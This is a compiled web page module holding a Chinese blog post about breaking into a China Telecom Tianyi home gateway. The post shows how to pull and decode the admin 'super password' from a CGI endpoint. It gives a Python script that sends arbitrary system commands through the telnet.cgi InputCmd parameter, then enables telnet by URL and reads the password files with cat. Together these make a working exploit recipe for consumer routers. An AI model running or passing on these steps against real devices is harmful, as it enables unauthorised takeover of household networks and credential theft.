import{_ as n,o as s,c as a,d as t}from"./app-CFIaTHNp.js";const p="/assets/20221222170415632_6307-BxAxhRgj.png",e="/assets/20221222171347277_19524-D2mrS_1N.png",o="/assets/20221222170648272_2876-CRAUzLf_.png",c="/assets/20221222170242535_17309-BrAYGI3z.png",i="/assets/20221222170248974_17861-Cf5ymn1-.png",l={},u=t('<h1 id="记一次破解天翼网关" tabindex="-1"><a class="header-anchor" href="#记一次破解天翼网关" aria-hidden="true">#</a> 记一次破解天翼网关</h1><blockquote><p>https://xz.aliyun.com/t/9046#toc-1</p></blockquote><ol><li>设备信息 <img src="'+p+'" alt="设备信息"></li></ol><p>2.首先获取超级密码 访问http://192.168.1.1:8080/cgi-bin/baseinfoSet.cgi</p><p><img src="'+e+'" alt=""></p><p>凯撒密码，编写python脚本来解密 <img src="'+o+`" alt=""></p><ol start="3"><li>使用超级账号密码登录</li></ol><p>访问http://192.168.1.1:8080/cgi-bin/telnet.cgi通过InputCmd参数可以直接执行系统命令， 访问http://192.168.1.1:8080/cgi-bin/submit.cgi可以看到执行结果，</p><p>编写简单的脚本, 方便看回显</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse
<span class="token keyword">import</span> requests

host <span class="token operator">=</span> <span class="token string">&quot;http://192.168.1.1:8080&quot;</span>
send_url <span class="token operator">=</span> host<span class="token operator">+</span><span class="token string">&quot;/cgi-bin/telnet.cgi&quot;</span>
response_url <span class="token operator">=</span> host<span class="token operator">+</span><span class="token string">&quot;/cgi-bin/submit.cgi&quot;</span>

<span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
	HEADERS <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/x-www-form-urlencoded;charset=utf-8&#39;</span><span class="token punctuation">}</span>
	data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;InputCmd&quot;</span><span class="token punctuation">:</span>cmd<span class="token punctuation">}</span>

	r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>send_url<span class="token punctuation">,</span> data<span class="token operator">=</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] send done:&quot;</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>

	rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>response_url<span class="token punctuation">)</span><span class="token punctuation">.</span>text
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] resp:&#39;</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>rep<span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
	<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
	    c <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span>
	    f<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="4"><li>打开telnet</li></ol><p>访问 192.168.1.1:8080/cgi-bin/telnetenable.cgi?telnetenable=1 即可</p><ol start="5"><li>寻找telnet密码</li></ol><p>尝试写入/etc/passwd， 但是不起作用，想着看看有没有明文密码</p><p>cat /flash/cfg/agentconf/factory.conf 没有 在/var 目录下找到一个密码文件，确定了</p><p><img src="`+c+'" alt=""></p><p>cat /var/telWan_passwd</p><p><img src="'+i+'" alt=""></p>',18),r=[u];function d(k,m){return s(),a("div",null,r)}const v=n(l,[["render",d],["__file","记一次破解天翼网关.html.vue"]]);export{v as default};
